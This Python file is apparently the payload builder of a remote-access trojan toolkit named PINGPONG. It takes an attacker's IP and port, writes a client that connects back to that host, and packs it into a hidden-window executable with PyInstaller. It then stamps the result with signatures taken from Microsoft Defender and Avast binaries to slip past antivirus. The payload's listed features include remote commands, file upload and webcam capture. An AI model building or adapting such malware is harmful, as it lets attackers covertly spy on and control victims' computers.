# -*- coding:utf-8 -*-
# @payload  :payload packer.py
# @Time      :2022/11/22 19:25:40
# @Author    :D0WE1L1N
from os import system, remove, mkdir, rename
from os.path import isfile, isdir, abspath, dirname, sep
from shutil import move, rmtree
from sys import path
from random import randint
install_path = path[4]
path.append("..")
import main, config_set
config_list = ['Default_ip', 'Default_port', 'usage']
#加载默认设置
def load_config(config_list, payload_d):
    local_var = globals()
    for con in config_list:
        data = payload_d[con]
        local_var[f'{con}'] = data
#随机生成密钥		
def generate_random_str(randomlength=16):
	random_str =''
	base_str ='ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
	length =len(base_str) -1
	for i in range(randomlength):
		random_str +=base_str[randint(0, length)]
	return random_str
#打包
def pack(payload, printf, upx_command, is_ask=True):
	glo = globals()
	main.print_normal("payload>[*]Loading settings......")
	payload_d = main.get_value('payload')
	load_config(config_list, payload_d)
	for key in usage.keys():
		value = usage[key]
		if value == '1':
			value = True
		elif value == '0':
			value = False
		else:
			main.print_error(f"payload>[-]datas error, cannot read data:{key}")
		glo[key] = value
	main.print_normal('payload>[*]Loading Done')
	if is_ask:
		ip = input(f"payload>[*]Please input the ip of your host(blank for {Default_ip})>")
		main.back_to_main(ip)
		port = input(f"payload>[*]Please input the port(blank for {Default_port})>")
		main.back_to_main(port)
		if port == "":
			port = Default_port
		if ip == "":
			ip = Default_ip
		try:
			port = int(port)
		except:
			print_error("handler>[-]port input error")
	else:
		ip = Default_ip
		port = Default_port
	main.print_normal("payload>[*]Printing out all the usage of your payload")
	main.print_normal(f"""payload>[*]
--------------------------usage--------------------------
	
	cmd: {cmd}
	upload: {upload}
	cam_shot: {cam_shot}
	priv_vbp_listen: {priv_vbp_listen}
	
	""")
	choice = input("payload>[*]Start?[y/n]>")
	if choice == 'y' or choice == 'Y' or choice == 'YES' or choice == 'yes':
		key = generate_random_str(randomlength=16)
		main.print_normal(f"The key is: {key}")
		current_path = abspath(__file__)
		father_path = abspath(dirname(current_path) + sep + ".")
		if upx_command != " " and upx_command != "":
			upx_command = "--upx-dir " + upx_command
		else:
			main.print_warn("payload>[!]TO MAKE THE PAYLOAD SMALLER, YOU'D BETTER INSTALL UPX AT https://upx.github.io/")
		print(f"{install_path}/Lib/site-packages")
		command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/payload.py {upx_command} --key {key} -w"
		command_sign_1 = f"python {father_path}/sign.py -i {father_path}/sign_sample/MsMpEng.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign.exe"
		command_sign_2 = f"python {father_path}/sign.py -i {father_path}/sign_sample/AvLaunch.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign_twice.exe"
		if printf:
			main.print_normal("payload>[*]Loading payload......")
			with open("./payload/" + payload + "_file.py", "r", encoding="utf8") as p:
				pay = p.read()
			with open("./payload/payload.py", "w+", encoding="utf8") as a:
					a.write(pay)
					a.write(f"""
if __name__ == '__main__':
	PINGPONG_client("{ip}", {port})""")
		else:
			with open("./payload/_basic_conn.py", "r", encoding="utf8") as p:
				pay = p.read()
			with open("./payload/payload.py", "w+", encoding="utf8") as a:
					a.write(pay)
					a.write(f"""
if __name__ == '__main__':
	_connent("{ip}", {port})""")
		try:
			system(command)
			if printf:
				main.print_normal("payload>[*]deleting temp files......")
			remove("./payload/payload.py")
			if isfile("payload.exe"):
				remove("payload.exe")
			if isdir("./payload/upload_payload"):
				rmtree("./payload/upload_payload")
			try:
				mkdir("./payload/upload_payload")
			except:
				pass
			if not printf:
				move("dist/payload.exe", "./payload/upload_payload")
				rename("./payload/upload_payload/payload.exe", "./payload/upload_payload/upload_payload.exe")
			else:
				move("dist/payload.exe", "./payload/upload_payload")
				rename("./payload/upload_payload/payload.exe", "./payload/upload_payload/PINGPONG_payload.exe")
			remove("payload.spec")
			rmtree("build")
			rmtree("dist")
		except(ImportError):
			main.print_warn("payload>[*]You might not install pyinstaller, installing it now......")
			system("pip install pyinstaller")
			if printf:
				print("payload>[*]re-packing")
			system(command)
		except(FileNotFoundError):
			if printf:
				main.print_normal("payload>[*]Something wrong when deleting temp files, but it doesn't really matter")
				main.print_warn("payload>[!]The payload file may be in the dir: ./dict")
		main.print_good("payload>[*]signing......")
		system(command_sign_1)
		system(command_sign_2)
		remove(f"{father_path}/upload_payload/PINGPONG_payload_sign.exe")
		remove(f"{father_path}/upload_payload/PINGPONG_payload.exe")
		f_father_path = abspath(dirname(father_path) + sep + ".")
		move(f"{father_path}/upload_payload/PINGPONG_payload_sign_twice.exe", f"{f_father_path}")
		rename(f"{f_father_path}/PINGPONG_payload_sign_twice.exe", f"{f_father_path}/payload.exe")
		if printf:
			main.print_good(f"payload>[+]Done Successfully, the payload is in {f_father_path}\payload.exe")
	else:
		main.print_normal("payload>[*]Back to the main console")
		main.main()


